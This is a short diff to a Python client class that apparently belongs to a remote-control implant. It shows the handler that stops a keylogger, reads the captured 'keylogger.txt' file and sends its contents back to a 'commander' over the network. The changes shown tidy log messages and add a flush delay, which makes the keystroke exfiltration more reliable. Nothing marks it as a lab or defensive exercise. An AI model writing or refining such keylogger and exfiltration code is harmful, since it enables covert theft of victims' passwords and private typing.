@@ -499,8 +499,9 @@ class Client:
             print(f"    Keylogger started")
 
         elif command_type == CommandType.KEYLOG_END:
-            print("[*] Processing STOP_WATCH")
+            print("[*] Processing KEYLOG_END")
             self._stop_keylogger()
+            time.sleep(0.2)  # give keylogger thread time to flush and close the file
             print("    Keylogger stopped.")
             try:
                 with open("keylogger.txt", 'rb') as f:
@@ -508,7 +509,7 @@ class Client:
                 print(f"    Sending {len(content)} bytes to commander")
                 self.send_response(src_ip, CommandType.ACK, content)
             except Exception as e:
-                print(f"    Error: {e}")
+                print(f"    Error reading keylog: {e}")
                 self.send_response(src_ip, CommandType.ERROR, str(e).encode())
 
 
